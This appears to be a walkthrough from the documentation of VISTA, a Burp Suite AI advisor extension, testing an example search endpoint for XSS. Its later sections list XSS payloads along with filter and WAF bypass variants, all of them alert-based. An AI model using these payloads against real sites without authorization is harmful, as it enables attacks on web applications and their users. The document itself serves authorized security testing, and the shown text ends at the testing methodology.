# VISTA AI Advisor - Real World Example

## Scenario: Testing a Search Endpoint for XSS

Let me walk you through a **complete real-world example** showing exactly what happens when you use VISTA's AI Advisor.

---

## 🎯 The Setup

**Target Application**: E-commerce website  
**Endpoint**: `https://shop.example.com/search?q=laptop`  
**Your Goal**: Test for XSS vulnerabilities  
**Tool**: Burp Suite + VISTA Extension

---

## 📋 Step-by-Step Walkthrough

### Step 1: Capture the Request in Burp

You browse to the search page and search for "laptop". Burp captures:

```http
GET /search?q=laptop HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/xhtml+xml
Cookie: session=abc123xyz
```

**Response**:
```html
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 2847

<!DOCTYPE html>
<html>
<head><title>Search Results</title></head>
<body>
  <h1>Search Results for: laptop</h1>
  <div class="results">
    <p>Found 42 products matching "laptop"</p>
    <!-- Products listed here -->
  </div>
</body>
</html>
```

---

### Step 2: Send to VISTA AI Advisor

**Action**: Right-click the request → "💡 Send to VISTA AI Advisor"

**What Happens Behind the Scenes**:


#### 2.1 VISTA Loads the Request

```java
// TestingSuggestionsPanel.java
public void setRequest(IHttpRequestResponse request) {
    this.currentRequest = request;
    
    // Display in UI
    requestArea.setText(HttpMessageParser.requestToText(request));
    responseArea.setText(HttpMessageParser.responseToText(request));
    
    // Start new session (automatic)
    statusLabel.setText("New Session: GET /search?q=laptop");
}
```

**UI Shows**:
```
🆕 NEW SESSION STARTED

Request loaded: GET /search?q=laptop HTTP/1.1

Ask me how to test for vulnerabilities!
```

---

### Step 3: You Ask a Question

**You Type**: "How to test for XSS?"

**You Click**: [Send]

---

### Step 4: VISTA Analyzes the Request (Behind the Scenes)

Now the magic happens! VISTA runs **10 different analyzers** on your request:



#### 4.1 Deep Request Analyzer (~800 lines of analysis)

```java
// DeepRequestAnalyzer.java
RequestAnalysis analysis = deepRequestAnalyzer.analyze(currentRequest);
```

**What It Extracts**:
```
=== DEEP REQUEST ANALYSIS ===

Endpoint Information:
- URL: https://shop.example.com/search
- Method: GET
- Protocol: HTTPS
- Path: /search
- Query String: q=laptop

Risk Assessment:
- Risk Score: 8/10 (HIGH RISK)
- Reason: User input in query parameter, reflected in response

Parameters Detected:
1. Parameter: q
   - Location: Query String
   - Value: laptop
   - Type: String
   - Validation: None detected
   - Encoding: None
   - Length: 6 characters
   - Special Chars: None
   - Potential Injection Point: YES

Predicted Vulnerabilities:
1. XSS (Cross-Site Scripting) - HIGH
   - Reason: Parameter reflected in HTML without encoding
   - Confidence: 85%
   
2. SSTI (Server-Side Template Injection) - MEDIUM
   - Reason: Search functionality often uses templates
   - Confidence: 40%

Headers Analysis:
- Cookie: session=abc123xyz (Session management present)
- User-Agent: Standard browser
- Accept: HTML content expected
- No security headers detected (X-XSS-Protection, CSP)

Technology Stack Indicators:
- Server: Not disclosed
- Framework: Unknown (no X-Powered-By header)
- Language: Likely PHP/Python/Node.js (common for search)
```



#### 4.2 Deep Response Analyzer (~600 lines of analysis)

```java
// ResponseAnalyzer.java
ResponseAnalysis respAnalysis = responseAnalyzer.analyze(currentRequest);
```

**What It Extracts**:
```
=== DEEP RESPONSE ANALYSIS ===

Response Metadata:
- Status Code: 200 OK
- Content-Type: text/html; charset=utf-8
- Content-Length: 2847 bytes
- Response Time: 142ms

Security Headers Analysis:
❌ Missing: Content-Security-Policy
❌ Missing: X-XSS-Protection
❌ Missing: X-Frame-Options
❌ Missing: X-Content-Type-Options
✓ Present: Content-Type with charset

Risk Assessment:
- Missing CSP: HIGH RISK (no XSS protection)
- Missing X-XSS-Protection: MEDIUM RISK
- Overall Security Posture: WEAK

Content Analysis:
- HTML Document: Yes
- JavaScript Present: Yes (inline scripts detected)
- Forms Present: Yes (search form)
- Input Fields: 1 (search box)
- External Resources: 3 (CSS, JS files)

Reflection Points Detected:
1. In <h1> tag: "Search Results for: laptop"
2. In <p> tag: 'Found 42 products matching "laptop"'

Encoding Analysis:
- HTML Encoding: NONE detected
- JavaScript Encoding: N/A
- URL Encoding: N/A
- Reflection Context: HTML Body (EXPLOITABLE!)

Error Messages:
- None detected

Sensitive Data Exposure:
- Session Cookie: Present (secure flag not checked)
- No obvious sensitive data in response
```



#### 4.3 Reflection Analyzer

```java
// ReflectionAnalyzer.java
ReflectionAnalysis reflectionAnalysis = reflectionAnalyzer.analyze(currentRequest);
```

**What It Finds**:
```
=== REFLECTION ANALYSIS ===

Input: "laptop"

Reflection Point #1:
- Location: Line 8, Column 25
- Context: HTML <h1> tag
- Before: <h1>Search Results for: 
- Reflected: laptop
- After: </h1>
- Context Type: HTML_BODY
- Encoding: NONE
- Exploitability: HIGH
- Suggested Payloads: <script>alert(1)</script>, <img src=x onerror=alert(1)>

Reflection Point #2:
- Location: Line 10, Column 42
- Context: HTML <p> tag
- Before: <p>Found 42 products matching "
- Reflected: laptop
- After: "</p>
- Context Type: HTML_BODY
- Encoding: NONE
- Exploitability: HIGH
- Suggested Payloads: Same as above

Summary:
✓ 2 reflection points found
✓ Both in HTML body context
✓ No encoding applied
✓ HIGH exploitability
✓ Recommended: Test basic XSS payloads first
```



#### 4.4 WAF Detector

```java
// WAFDetector.java
List<WAFInfo> wafList = WAFDetector.detectWAF(response, headers, statusCode);
```

**What It Detects**:
```
=== WAF DETECTION ===

Analyzing response headers and patterns...

WAF Detected: NONE
- No Cloudflare headers
- No AWS WAF signatures
- No Akamai patterns
- No ModSecurity indicators
- No rate limiting detected

Risk Level: HIGHER (No WAF protection)
Bypass Techniques: Not needed
Testing Approach: Standard payloads should work
```

---

#### 4.5 Payload Library Integration

```java
// PayloadLibraryAIIntegration.java
String payloadContext = payloadLibraryAI.getPayloadContextForAI(
    "XSS", "HTML_BODY", true, 8);
```

**What It Provides**:
```
=== PAYLOAD LIBRARY (Proven Payloads) ===

Relevant Payloads for XSS in HTML_BODY context:

Payload #1: <script>alert(1)</script>
- Category: XSS
- Context: HTML_BODY
- Success Rate: 92% (23/25 tests)
- Last Success: 2 days ago
- Complexity: Basic
- WAF Bypass: No
- Notes: Works when no filtering present

Payload #3: <img src=x onerror=alert(1)>
- Category: XSS
- Context: HTML_BODY
- Success Rate: 78% (19/24 tests)
- Last Success: 1 day ago
- Complexity: Basic
- WAF Bypass: No
- Notes: Alternative to script tags

Payload #7: <svg onload=alert(1)>
- Category: XSS
- Context: HTML_BODY
- Success Rate: 65% (13/20 tests)
- Last Success: 3 days ago
- Complexity: Basic
- WAF Bypass: Yes (bypasses some filters)
- Notes: Good for tag-based filters

Library Statistics:
- Total Payloads: 247
- XSS Payloads: 89
- HTML_BODY Context: 34
- Average Success Rate: 71%
```



#### 4.6 Bypass Knowledge Base

```java
// BypassKnowledgeBase.java
String bypassKnowledge = BypassKnowledgeBase.getBypassKnowledge("XSS");
```

**What It Provides** (excerpt):
```
=== BYPASS KNOWLEDGE BASE ===

XSS Testing Techniques (from PayloadsAllTheThings):

Basic Payloads:
- <script>alert(1)</script>
- <img src=x onerror=alert(1)>
- <svg onload=alert(1)>

Filter Bypass Techniques:
1. Case Variation: <ScRiPt>alert(1)</sCrIpT>
2. Encoding: %3Cscript%3Ealert(1)%3C/script%3E
3. Double Encoding: %253Cscript%253E
4. Unicode: \u003cscript\u003e
5. HTML Entities: &lt;script&gt;alert(1)&lt;/script&gt;

Context-Specific:
- HTML Attribute: " onload="alert(1)
- JavaScript String: '; alert(1);//
- HTML Comment: --><script>alert(1)</script><!--

WAF Bypass:
- Cloudflare: <svg/onload=alert(1)>
- AWS WAF: <img src=x onerror=alert`1`>
- ModSecurity: <script>alert(String.fromCharCode(88,83,83))</script>

[... 500+ more techniques ...]
```

---

#### 4.7 Systematic Testing Methodology

```java
// SystematicTestingEngine.java
TestingMethodology methodology = SystematicTestingEngine.getMethodology(
    userQuery, request, response);
```

**What It Generates**:
```
=== SYSTEMATIC TESTING METHODOLOGY ===

Phase 1: Reconnaissance
✓ Identify injection points (q parameter)
✓ Analyze reflection context (HTML body)
✓ Check for encoding (none detected)
✓ Detect WAF (none present)

Phase 2: Basic Testing
→ Test basic XSS payload
→ Verify reflection in response
→ Check if JavaScript executes

Phase 3: Filter Detection
→ If blocked, identify filter type
→ Test encoding variations
→ Test alternative tags

Phase 4: Bypass Development
→ Apply context-specific bypasses
→ Test WAF evasion techniques
→ Iterate until successful

Phase 5: Impact Assessment
→ Verify exploitability
→ Test in real browser
→ Document findings
```

